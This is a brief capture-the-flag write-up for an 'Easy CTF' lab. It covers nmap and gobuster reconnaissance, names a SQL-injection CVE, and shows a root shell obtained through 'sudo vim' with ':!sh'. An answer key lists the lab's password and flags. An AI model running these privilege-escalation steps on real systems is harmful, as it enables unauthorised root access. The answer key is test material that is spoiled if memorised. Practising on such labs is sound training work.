# Easy CTF

## Meta

### IP

```
export IP=10.10.171.156
```

### Check open ports

```
nmap -sC -sV -oN nmap/initial.txt $IP

[+] 21 FTP
[+] 80 Apache httpd 2.4.18
[+] 2222 ssh
```

### Check hidden direcotries

```
gobuster dir --word-list /usr/share/wordlist/dirbuster/
```

### Find other user

```
ls /home

mitch sunbath
```

### Leverage to spawn a priviliged shell

[x] check kernel version
[x] check OS version
[x] Files with SUID bit set
[x] Sudo rights

Helpful scripts are LinPeas or LinEnum.sh

```
sudo -l

/usr/bin/vim
```

```
sudo vim test
:!sh - restart shell. Use root priv.
```
## Questions

### How many services are running under port 1000?
```
2
```
### How many services are running under port 1000?
```
ssh
```

### What's the CVE you're using against the application? 
```
CVE-2019-9053
```
### To what kind of vulnerability is the application vulnerable?
```
sqli
```
### What's the password?
```
secret
```
### Where can you login with the details obtained?
```
ssh
```
### What's the user flag?
```
G00d j0b, keep up!
```
### Is there any other user in the home directory? What's its name?
```
ls /home
sunbath
```
### What can you leverage to spawn a privileged shell?
```
sudo -l

vim

:!sh
```
### What's the root flag?
```
W3ll d0n3. You made it!
```